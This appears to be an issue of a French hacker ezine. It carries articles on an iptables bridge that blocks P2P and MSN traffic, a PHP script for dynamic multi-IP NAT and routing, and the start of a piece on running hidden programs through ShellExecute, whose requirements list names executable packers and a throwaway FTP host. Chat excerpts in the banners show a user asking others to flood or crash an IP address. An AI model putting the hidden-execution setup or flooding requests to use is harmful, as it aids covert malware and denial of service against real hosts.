 || |&lt;An0n1mUs> jai jflood po souvans tsΘ                              \\_  \_ \   \\_  
 ||,|&lt;An0n1mUs> jprend so jenre pour eu ki me fon chier                \_ \   \\_  \_ \.
 || |&lt;An0n1mUs> jai un autre user                                        \\_  \_ \  _\\_  
/ | |&lt;An0n1mUs> pour po me faire reconnaitre                             \_ \   \\_/    \
 / ;|&lt;An0n1mUs> pi tout                                                    \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ #hack.fr un endroit bourrΘ d'╔lite                                    ]=\:\  |
  \__\__________________________________________________________________________________/  


  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[O6]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ Un affaire de spying          ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka:AmΘliorer la productivitΘ d'une secrΘtaire dans un nutshell]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[   Mr_Peuch   ]=\:\ _//     
                                                  \__\________________________/__/ 

-=== Starring ===-
Mr_Peuch
Initnull

-=== Table des matiΘres ===-
1. Introduction

2. MatΘriel et Logiciels Requis

3. Installation

4. Configuration


///////////////////////////
/-=== 1. Introduction ===-/
///////////////////////////



	Le prΘsent article α ΘtΘ crΘΘ dans le but unique d'informer la population de sysadmin 
que,  OUI,  il  est  possible  d'Θliminer  le  problΦme  de  MSN ( dans certain Θtablissement 
d'enseignement par exemple) ou encore  les  fameux  logiciels  de  p2p  qui  bouffe  la bande 
passante de votre entreprise.  La solution  que  je  vous  propose  aujourd'hui  consiste  en 
l'Θlaboration d'un pont transparent qui permet le filtrage de ces nuisances sans mΩme que les 
usagers ne s'en  rende  compte, si ce n'est que pour vous appeler parce que son msn ne marche 
plus! a. PrΘsentation de la technologie


==UN BRIN DE TH╔ORIE==

------------------------
-   Pont transparent   -
------------------------

	Les ponts transparents  sont  basΘs  sur  la  norme IEEE 802.1D. SituΘ au niveau 2 du 
modΦle OSI les adresses MAC  des  trames  sont stockΘes dans une table de routage. De plus en 
utilisant une mΘthode dÆauto apprentissage le  pont  pourra  dΘterminer  sur  quel segment du 
rΘseaux sera situΘ le destinataire.

	Pour  ce  faire le pont Θcoute tous les paquets transmis. Chaque fois quÆil reτoit un 
paquet il stocke lÆadresse  source  et  le  port  par  lequel  il a ΘtΘ envoyΘ. Ensuite il va 
parcourir sa table dÆadresse pour trouver le destinataire.

- - Fonctionnement

	Pour  chaque  paquet  reτu,  le  pont  enregistre  lÆadresse qui figure dans le champ 
dÆadresse de source du paquet dans une mΘmoire cache, en mΩme temps que le port sur lequel le 
paquet a ΘtΘ reτu. Deux solutions ce prΘsentes alors :


    1) SÆil  ne  trouve  pas  le  destinataire  alors  il  renvoie  le  paquet sur toutes les 
       interfaces sauf celle qui vient dÆΘmettre.
    2) LorsquÆil trouve le  destinataire  il  se contente  dÆacheminer  le  parquet   jusqu'α 
       destinataire en utilisant la table quÆil possΦde.
    3) Dans le cas ou il trouve le destinataire et que ce dernier est sur le mΩme segment que 
       lÆexpΘditeur alors il Θlimine le paquet.

       On  peut  considΘrer  les  firewall  comme  des  ponts  transparent  dans  les rΘseaux 
dÆentreprise car ils font du transfert de trame dÆune premiΦre interface vers  une  deuxiΦme. 
Les firewall peuvent travailler de la couche 3 α 7  du  modΦle  OSI.  Dans  notre  cas,  nous 
utiliserons la couche 7 (Yuss! thx to google.ca for this part)

	Voici le shema α quoi cela ressemble :

   _____________	___________________	    ____________________
   |	       |    eth0|		   |eth1    |			|
---| Interbret |--------| Pont transparent |--------| Gateway ou switch |---- whatever
   |___________|	|__________________|	    |___________________|

-------------------------
-  Module iptables-p2p  -
-------------------------

	Le module iptables-p2p est un module α la base conτu pour effectuer  des  matchs  sur 
les  protocoles  p2p  au niveau de la couche application, donc la OSI Layer 7.  Cependant, il 
est conτu Θgalement pour ne pas marcher! Je  m'explique.  Les  diffΘrentes sΘquences de match 
ne sont pas vraiment les bonnes avec le module par dΘfaut. C'est  la que le programmeur entre 
en jeux.


	Chaques  sΘquences  est  contenue  dans  un  fichier  .c  diffΘrent  pour  chacun des 
protocoles ie. fastrack.c pour  le  protocole fastrack.  Le  principe est simple, pour chaque 
paquet recu au travers du firewall, le modules  effectue un  challenge  avec  les diffΘrentes 
sΘquences qu'il connait et drop le paquet s'il a rencontrΘ un match  avec  n'importe quel des 
sΘquences.  D'ailleurs, c'est pour cela qu'il faut une bonne machine!

	Le version  que  initnull  et  moi  avons  modifiΘe, ajoute de nouvelles sΘquences et 
amΘliore celle par dΘfaut. Par exemple, nous avons  conτu  un  module pour Θradier totalement 
MSN et les web messenger du rΘseau.

	└ noter, pour terminer,  que  malheureusement  lorsque les logiciels de p2p update ou 
passe α une nouvelle version, il arrive que les sΘquences  ne  soit  plus  valide.  Ce module 
requiert une maintenance continue.
 


///////////////////////////////////////////
/-=== 2. MatΘriel et Logiciels Requis ===-/
///////////////////////////////////////////

	MatΘriel Requis:
		- Un  PC plus puissant qu'un cΘlΘron 333 (si vous avez plus de 5mbit de bande 
                  passante)
		- 2 carte rΘseau 10/100 ( 2 carte rΘseau 10/100/1000 font encore mieux )

	Logiciel Requis:
		- Linux
		- bridge-utils
		- iptables
		- Module iptables-p2p lΘgΦrement modifier par initnull et mr_peuch
			---> Fichier dispo ici : http://www.mindkind.org/mr_peuch/iptables.tgz
                        (aussi disponible dans la version full .tar.gz du ezine)

///////////////////////////
/-=== 3. Installation ===-/
///////////////////////////

	Lors de la procΘdure d'installation, nous allons considΘrer que :
		- Vos  2  cartes  rΘseaux  sont  dΘtectΘs  par  le  OS et sont prΘsentes dans 
                  ifconfig
		- Iptables est fonctionnel et tous les modules necessaires ont ΘtΘ installΘs
		- Vous Ωtes un sysadmin accompli
		- De  toute  maniΦre, il  y  a un readme dans le fichier fourni et un install 
                  script :P

iptables -F
rmmod ipt_p2p
make clean
make
cp ./iptables/libipt_p2p.so /usr/lib/iptables/
rm -f /lib/modules/2.6.11-rc1/kernel/ipt_p2p.ko
cp ./kernel/ipt_p2p.ko /lib/modules/2.6.11-rc1/kernel/
insmod /lib/modules/2.6.11-rc1/kernel/ipt_p2p.ko


	

////////////////////////////
/-=== 4. Configuration ===-/
////////////////////////////

a. CrΘation du bridge
	#CrΘation d'un interface virtuelle
	brctl addbr MSNDevil

	#Assignation des interfaces
	brctl addif eth0
	brctl addif eth1

	#Active l'interface
	ifconfig MSNDevil up
	
	nb. en ne donnant pas de IP a l'interface virtuelle, il sera impossible pour vous  ou 
            quiconque de  se  ployer  sur  cette  machine  a  distance.  Si vous envisagez la 
            possibilitΘ qu'un jour vous ayez α vous ployez α distance, donner lui un IP.

	ps. Copier  ces  lignes  dans /etc/rc.d/rc.local (eh oui, j'utilise slack) pour qu'au 
            dΘmarrage tout ce reconfigure like a pro.

b. CrΘation de l'ACL

	Il existe 3 level de sysadmin :
		- Le parano
		- Le normal
		- Le bretteux

	Pour le parano :
		#On block toute les p2p et msn a tlm
		iptables -A FORWARD -m p2p --p2p all -j DROP

	Pour le normal :
		#On n'oubli de ce bloquer
		iptables -A FORWARD -s monipleet -m p2p --p2p all -j ACCEPT
		iptables -A FORWARD -d monipleet -m p2p --p2p all -j ACCEPT
		
		#Personne est cool as yourself anyway ( On drop le reste )
		iptables -A FORWARD -m p2p --p2p all -j DROp

	Pour le bretteux :
		#Gl HF
		#On jou avec le module en fonction des besoins du monde, des hres et des hres 
		#de plaisir fou

	ps. Mettre sa dans /etc/rc.d/rc.firewall pour que qu'au dΘmarrage tout ce reconfigure

-==					            ==-
-=  Site D'essais : **level 1 clearance required**   =-
-=		Results : Working Good		     =-
-==					     	    ==-

VOILA! 			

(c) Copyright 2005-2006 - Mr_Peuch, InitNull( qui ne sais pas que son nom est dans ce texte)

EOF





  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || |                                                            \\_  \_ \   \\_ -  : '
 ||`|&lt;An0n1mUs> peu tu mfaire planter so?                        \_ \   \\_  \_ \ 1   
 || |&lt;An0n1mUs> sam gosse                                          \\_  \_ \   \\_ 1  + 
 || |&lt;An0n1mUs> 66.252.6.15                                        \_ \   \\_  \_ \ 1   
 ||'|&lt;An0n1mUs> jel flood                                            \\_  \_ \   \\_  x 
 || |&lt;An0n1mUs> pi tout sa marche po                                 \_ \   \\_  \_ \  `
 || |&lt;An0n1mUs> yer po plantable                                       \\_  \_ \   \\_  
 ||,|                                                                  \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ #hack.fr un endroit remplit de gentlement fier et dΘbrouillard        ]=\:\  |
  \__\__________________________________________________________________________________/ 


  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[O7]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ ip route, iptable and I       ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka: tourne a gauche, a gauche, A GAUCHE TABARNAC              ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[  Wyzeman     ]=\:\ _//     
                                                  \__\________________________/__/ 

	

	Apres avoir vu notre x refuser pour #code.fr undernet, a cause que par  erreur javais 
joigner le chan avec le meme ip pour mes 2 users, jme suis dit  fuck,  jamais  plus  et je me 
suis atteler a terminer un vieux projet oublier pour des raisons plutot obscure et enboucaner 
par la memoire weedique. Cetais un  projet  de  routing + nat  dynamique  afin  de partager a 
lensemble dun reseau des  ip internet different ( le routing etant necessaire a tout ceux qui 
on pas de switch  et  utilise  des  cartes  reseau  supplΘmentaire  dans  leur  routeur  pour 
compenser). De plus il sagit dune bonne occasion pour dΘmontrer qu'on peu facilement utiliser 
php comme puissant langage de script console. 


	Le script qui suit est adapter a toute connection dynamique, mais peu aussi supporter 
sans probleme ny modification linclusion dune ligne physique  stable de type cable combiner a 
plusieur interface ppp dune connection adsl a la  seul  limitation  que la ligne stable devra 
etre utiliser comme interface par default  (jusqu'a  l'amΘlioration  de  se script.  Pour   y 
arriver, seulement 3 petite etapes seront necessaire

	1) collecte et parsing des ip internet
	2) ajustement des table de nat
	3) ajustement des table de routing (seulement si vous navez pas 
	   de switch/hub).

minimal requirement 
	1) php 4
	2) iproute2
	3) iptables
	4) module nat et masquerading du kernel, 2.4 ou 2.6
	5) ifconfig 


	
etape  1) collect et parsing des ip internet

	la maniere la plus simple consiste a appeller ifconfig a l'aide  de  la commande  php 
shell_exec rediriger dans une variable buffer et  ensuite  d'analyser  se  buffer.  afin   de 
simplifier le contenu a parser, l'utilisation de grep est une bonne idee. 

$bin['ifconfig']="/sbin/ifconfig |grep addr:";
$exeption[1]="192.168.0.1";
$exeption[2]="192.168.1.1";
$exeption[3]="192.168.2.1";
$exeption[4]="127.0.0.1";


	//parsing des ip
	//cette commande retourne dans $ret le resultat de /sbin/ifconfig |grep addr 
        //ce qui fait en sorte que seul les lignes ou apparraisse un addresse ip sont
        //conserver
	@$ret = shell_exec($bin['ifconfig']);
	//on decoupe le tout en mots, afin de rendre possible lanalyse individuel de
        //chacun de ceux ci.
	$word = explode(" ",$ret);
	$z = 0;
	for ($x=0;$x&lt;count($word);$x++)
		{
//		echo $x." ".$word[$x]."\r\n";
		//la petite gymnastique qui suit sert a separer les ip de "addr:" 
                //de leur format originel "addr:192.168.1.1" et sert aussi de
		//trigger a savoir si on a un ip ou pas (si le mots present est addr:
		//le mots suivant est un ip)
		$addr = explode(":",$word[$x]);
		for ($y=0;$y&lt;count($addr);$y++)
			{
			if ($addr[$y] == "addr")
				{
				$nbr = $y;
				$nbr++;
				//echo $addr[$nbr]."with".array_search($addr[$nbr],$exeption)."\n";
				//ici on recherche tout squi nest pas dans la liste dexeption. 
				//array_search retourne la location du segment rechercher dans larray
				//sous forme numeric, donc sil ne le trouve pas, le contenu du return
                                //nest pas numeric (et non il ne retourne pas 0 puisque 0 pourrais
                                //etre un identifiant d'array.
				if (!is_numeric(array_search($addr[$nbr],$exeption)))
					{
					//echo $addr[$nbr]."\n";
					$ip[$z]=$addr[$nbr];
					$z++;
					}
				}
			}
		}



	bon, tout ca devrais nous donner un array ($ip) contenant  tout  les  ip  lister  par 
ifconfig  qui ne sont pas defini comme ip local dans larray $exeption. a parti de ces ip nous 
allons  retravailler  les  tables  de  nat  et de routing afin de les rendre compatible a nos 
besoin.

2) ajustement des table de nat

	Comme  se  sujet  a  largement  ΘtΘ  expliquer  dans  un  prΘcΘdent article Θcrit par 
init_null je ne mΘtendrais pas trop sur le sujet, et  me  contentΘ  de  vous  dire  le strick 
minimum pour que ca fonctionne. Il faut modifier les  options  PREROUTING  ET POSTROUTING des 
tables nat et attribuer un ip net a un ip local. Lancer a partir dun bash shell cest commende 
prenne les formes  suivante.  Repetez l'operation autant de fois que vous avez de pc a linker 
(les pc non identifier vont prendre par default les  valeurs  du  routeur  (qui  par  default 
utilise la premiere connection internet disponible). 

iptables -t nat -A PREROUTING -d 67.68.123.34 -p TCP --dport 1:65535 -j DNAT --to 192.168.1.200
iptables -t nat -A POSTROUTING -s 192.168.1.200 -p TCP -j SNAT --to 67.68.123.34

	et  pour  satisfaire les autres clients inatendu et leur partager la  connection  par 
default

iptables -t nat -A POSTROUTING -j MASQUERADE


	le probleme qui fait qu'un script est necessaire pour  tout  ca  est  que  la  valeur 
(fictive) du ip net (67.68.123.34, dans lexemple ici), est  une  valeur  dynamique  qui   est 
changer a chaque fois que la connection avec  le  isp  (fai) est demander. la parti #1 sur le 
parsing servait justement a  identifier  ces ip ($ip) que nous devons maintenant attribuer au 
ordi de notre reseau locale ($client).


$bin['iptables']="/sbin/iptables";
//cest variable serve a dΘfinir les ip de vos 
$client[0]="";
$client[1]="192.168.1.200";
$client[2]="192.168.2.200";

	// reset du routing nat
	// comme on veut faire ca simple on sassure de reseter les regles de nat avant dajouter les nouvelles. 
	shell_exec($bin['iptables']." -t nat -F");
	//recreation du routing nat
	for ($x=$supervariablehot;$x<$z;$x++)
		{
	//	echo $bin['iptables']." -t nat -A PREROUTING -d ".$ip[$x]." -p TCP --dport 1:65535 -j DNAT --to ".$client[$x]."\r\n";
	//	echo $bin['iptables']." -t nat -A POSTROUTING -s ".$client[$x]." -p TCP -j SNAT --to ".$ip[$x]."\r\n";
		@shell_exec($bin['iptables']." -t nat -A PREROUTING -d ".$ip[$x]." -p TCP --dport 1:65535 -j DNAT --to ".$client[$x]);
		@shell_exec($bin['iptables']." -t nat -A POSTROUTING -s ".$client[$x]." -p TCP -j SNAT --to ".$ip[$x]);
		//shell_exec($bin['route']." del default");
		
		}
	shell_exec($bin['iptables']." -t nat -A POSTROUTING -j MASQUERADE");


il ne faudrais pas oublier dajouter dans votre fichier  local  du  processus  init  la  ligne 
suivante, elle authorise le kernel a utiliser les regles de nat contenu dans le firewall.

echo "1" > /proc/sys/net/ipv4/ip_forward



2.1) supplement : support dhcp et ip statique.


	Il est possible de configurer un serveur DHCP de facon a ce que  vos  ip  de  machine 
local soit confirmer par le dit serveur au lieu detre hardcoder dans  chaque  conf et que vos 
ordi conserve toujours le meme ip (cest pratique pour  utiliser  la  variable  $exeptio n  du 
script). on y arrive avec une configuration semblable a celle ci :
	

#pour tout ce qui est inconu utilisant la carte ethernet #1 comme gateway
#on defini un range de ip dans lequel faire un choix, le nom des serveur 
#dns ainsi que le ip du routeur
subnet 192.168.1.0 netmask 255.255.255.0 {
        range 192.168.1.100 192.168.1.254;
        option broadcast-address 192.168.1.255;
        option domain-name-servers 192.168.1.1, 66.201.225.97;
	option routers 192.168.1.1;
}



#pour tout ce qui est inconu utilisant la carte ethernet #2 comme gateway
#meme chose en gros que pour la carte #1
subnet 192.168.2.0 netmask 255.255.255.0 {
        range 192.168.2.100 192.168.2.254;
        option broadcast-address 192.168.2.255;
        option domain-name-servers 192.168.2.1, 66.201.225.97;
        option routers 192.168.2.1;
}


#pour different materiel identifier par la mac addresse, des ip peuvent etre 
#preselectionner et forcer, des host peuvent etre utiliser, mais si vous en 
#utiliser des moindrements bizard votre serveur dns doit etre selectionner 
#comme #1 dans le fichier /etc/resolv.conf avant ceux donner par votre isp
host laptop {
        hardware ethernet 00:02:3F:6A:00:D6;
        fixed-address Spoutnik.wyzeman.mkd;
#       fixed-address 192.168.2.2;
        option routers 192.168.2.1;
}

host tower {
        hardware ethernet 00:0A:E6:8A:4B:4C;
        fixed-address Playstation.wyzeman.mkd;
        option routers 192.168.1.1;
}



2.2)forcer le service locale comme dns par default


dans  le  fichier  rc.local ( ou  sont  equivalent (/etc/conf.d/local.start sous  gentoo  par 
exemple)). ajouter les lignes suivante :


echo "nameserver 192.168.1.1" > /etc/antiresolv.conf
cat /etc/resolv.conf >> /etc/antiresolv.conf
mv /etc/antiresolv.conf /etc/resolv.conf


elle permettre de forcer la machine locale comme premier serveur dns tout en  conservant ceux 
donner  par  default  a  votre  machine  lors  du processus initial (noter que si vous lancer 
pppoe-start apres, ca va annuler leffet de ce "patch")


3) ajustement des table de routing



 	Il ne reste plus qu"une seul etape α accomplir avant datteindre notre but.  Celle  de 
dynamiser les tables de routing. Noter que cette etape est nescessaire   uniquement  si  vous 
utilisez plusieur carte reseau au lieu dun switch (puisque  celle-ci doivent etre sur un sous 
rΘseau different les un des autres. (192.168.1.1 ,  192.168.2.1, etc) (notez que vous  pouvez 
recreer un peu le meme environement en  creant  des  interfaces virtuel (eth0:0 eth0:1, etc). 
Vous devez a prime abord creer  2  nouvelle table dans le fichier conf de route. (cette etape 
na besoin que detre  faite  une  fois,  alors  elle na pas ete integrer a ce script (pour une 
version + complete voir un affaire de script++ plus loin dans ce ezine).



Un coup cest table creer, pour les rendres fonctionnel, elle doivent etre equiper d'un set de 
rules, 2 en particulier, une qui definira  la  connection par default a utiliser pour tout ce 
qui sera referer a cette table  par  la creation de la 2eme rulez qui elle sert de "catcher". 
Dans mon exemple  jai  creer  2  table  soit  PPP1  et  PPP2  qui represente respectivement 2 
interface adsl du meme nom. Si je tapais c ligne a la main ca ressemblerais a ceci:



ip route add default via 67.68.123.34 dev ppp1 table PPP1
ip route add from 192.168.1.200 table PPP1


la 2eme rule envoyant tout ce qui vient de 192.168.1.200 a la table PPP1 qui elle stipule que 
toute requete passant par elle doit utiliser la sorti net 67.68.123.34  sauf  sous indication 
contraire. repetez la meme procedure pour  tout  les interfaces que vous desirez linker a une 
machine en particulier.



$bin['route']="/sbin/ip route";
$bin['rule']="/sbin/ip rule";

//represente ici le nom des tables que vous desirer donner pour les differentes rules
//que vous allez creer. Pour le premier rien nest nescessaire puisque la rules par
//default (route add default gw ip), va fonctionner, et cette rulez est creer par 
//adsl-connect
$route[0]="";
$route[1]="PPP1";
$route[2]="PPP2";

$client[0]="";
$client[1]="192.168.1.200";
$client[2]="192.168.2.200";



	for ($x=$supervariablehot;$x<$z;$x++)
		{
		@shell_exec($bin['route']. " flush table ".$route[$x]);
		@shell_exec($bin['rule']." del from ".$client[$x]." table ".$route[$x]);
		@shell_exec($bin['route']." add default via ".$ip[$x]." dev ppp".$x." table ".$route[$x]);
		@shell_exec($bin['rule']." add from ".$client[$x]." table ".$route[$x]);
		}


	Nous voici donc avec un script utilisable qui permet  de  sharer  entre  plusieur  pc 
local plusieur ip web different. Etant donnΘ que  les  avantages  d'une  telle  configuration 
parle deux memes, je ne vois pas le besoin de  mΘtendre  sur les raisons  pour  lesquel  vous 
devriez utiliser linformation expliquΘ dans cette article.  Je  me  contenterais donc de vous 
souhaiter  un heureux routing. 

voici le code dans sont integraliter :


<?PHP
//then wyzeman create this mini world
set_time_limit(0);

//path des executables (la solution la plus simple
//pour ouvrir une porte est de tourner la poigner)
$bin['ifconfig']="/sbin/ifconfig |grep addr:";
$bin['iptables']="/sbin/iptables";
$bin['route']="/sbin/ip route";
$bin['rule']="/sbin/ip rule";
//ip des amis sur le reseau, fuck les guess 
//i sont masquerade plus loin anyway
//si vous etes en dhcp vous etes assez vieu
//pour lire une mac address (man dhcpd)
$client[0]="";
$client[1]="192.168.1.200";
$client[2]="192.168.2.200";
//nom des tables de routing (le main est reecrit par rp-pppoe btw)
$route[0]="";
$route[1]="PPP1";
$route[2]="PPP2";
//liste des ip qui ne sont pas a router
//genre les ip des cartes reseau du routeur
//et le local loop bret cossin
$exeption[1]="192.168.0.1";
$exeption[2]="192.168.1.1";
$exeption[3]="192.168.2.1";
$exeption[4]="127.0.0.1";
//PS : la valeur represenant la carte linker au HSE sont "bidon",
//vu que aussi bien utiliser le main default routing pour le routeur 
//lui meme. dans mon cas c eth0 alors $client[0] et $route[0] ne
//sont pas pris en compte si la variable suivante est a 1 (donc,
//vous pouvez nater aussi le ppp0 et le partager avec un autre ordi
//(oublier pas que le masquerade utilse aussi le ppp0)) !
$supervariablehot =1;
//PSS : linverse est aussi vrai pour reserver un pool de ip ppp pour 
//votre routeur ou un autre reseau.

while(1)
	{
	//parsing des ip
	@$ret = shell_exec($bin['ifconfig']);
	$word = explode(" ",$ret);
	$z = 0;
	for ($x=0;$x&lt;count($word);$x++)
		{
//		echo $x." ".$word[$x]."\r\n";
		$addr = explode(":",$word[$x]);
		for ($y=0;$y&lt;count($addr);$y++)
			{
			if ($addr[$y] == "addr")
				{
				$nbr = $y;
				$nbr++;
				//echo $addr[$nbr]."with".array_search($addr[$nbr],$exeption)."\n";
				if (!is_numeric(array_search($addr[$nbr],$exeption)))
					{
					//echo $addr[$nbr]."\n";
					$ip[$z]=$addr[$nbr];
					$z++;
					}
				}
			}
		}
	// reset du routing nat
	shell_exec($bin['iptables']." -t nat -F");
	//recreation du routing nat
	for ($x=$supervariablehot;$x<$z;$x++)
		{
	//	echo $bin['iptables']." -t nat -A PREROUTING -d ".$ip[$x]." -p TCP --dport 1:65535 -j DNAT --to ".$client[$x]."\r\n";
	//	echo $bin['iptables']." -t nat -A POSTROUTING -s ".$client[$x]." -p TCP -j SNAT --to ".$ip[$x]."\r\n";
		@shell_exec($bin['iptables']." -t nat -A PREROUTING -d ".$ip[$x]." -p TCP --dport 1:65535 -j DNAT --to ".$client[$x]);
		@shell_exec($bin['iptables']." -t nat -A POSTROUTING -s ".$client[$x]." -p TCP -j SNAT --to ".$ip[$x]);
		//shell_exec($bin['route']." del default");
		
		}
	//criss de cossin poche pour ip route
	for ($x=$supervariablehot;$x<$z;$x++)
		{
		@shell_exec($bin['route']. " flush table ".$route[$x]);
		@shell_exec($bin['rule']." del from ".$client[$x]." table ".$route[$x]);
		@shell_exec($bin['route']." add default via ".$ip[$x]." dev ppp".$x." table ".$route[$x]);
		@shell_exec($bin['rule']." add from ".$client[$x]." table ".$route[$x]);
		}
	//pi fuck all le reste
	shell_exec($bin['iptables']." -t nat -A POSTROUTING -j MASQUERADE");

	//a ti pipi papa 
	sleep(10);
	}

?>

 


  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || |* eth has joined #hack.fr                                   \\_  \_ \   \\_ -  : '
 ||`|&lt;eth> that site is gay                                      \_ \   \\_  \_ \ 1   
 || |&lt;eth> how can you hack in french ?                            \\_  \_ \   \\_ 1  + 
 || |&lt;eth> lol                                                     \_ \   \\_  \_ \ 1   
 ||'|&lt;XJu|iAX> banner moi ca                                         \\_  \_ \   \\_  x 
 || |&lt;eth> don`t know english ?                                      \_ \   \\_  \_ \  `
 || |&lt;eth> gay french !                                                \\_  \_ \   \\_  
 ||,|* eth has left #hack.fr                                           \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ #hack.fr une place ou on hack en francais, oui oui!                   ]=\:\  |
  \__\__________________________________________________________________________________/ 

  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[O8]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ un affaire de shellexecute    ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka: fun with shellexecute                                     ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[    waxaw     ]=\:\ _//     
                                                  \__\________________________/__/ 



L'article qui suis se veut une introduction α la fonction ShellExecute et α certaine commande  
DOS. La  fonction  ShellExecute est disons trΦs utile  car  elle  nous  permet  d'ΘxΘcuter un  
programme  α  partir du notre. Par exemple lorsque l'on dΘmarre notre  programme il  pourrait 
ouvrir 1000 notepad. Ce qui est encore plus rigolo avec cette  fonction,  c'est  quelle  nous 
permet d'exΘcuter ces programme en cachant la fenΩtre qui apparait  lorsque  l'on  exΘcute un  
programme. Par exemple ouvrir 1000 notepad invisible... Pour voir s'il sont vraiment  dΘmarer  
il  suffit de faire ctrl+alt+del pour voir les 1000 notepads. 

C'est ben beau cette fonction mais ou cΘ que j'men sert!
Voici ce dont tu as besoin:
	MS Visual Studio 6.0  et  plus  prΘcisΘment VC++ ( Pour la crΘation de notre 
        programme. )
	FSG 2.0 - bart/xt ou Mew11 SE ( Pour que notre programme soit mini )
	Un compte bidon sur tripod.com pour un FTP gratuit.
	Un bon 5 min α perdre.

===========================================================================

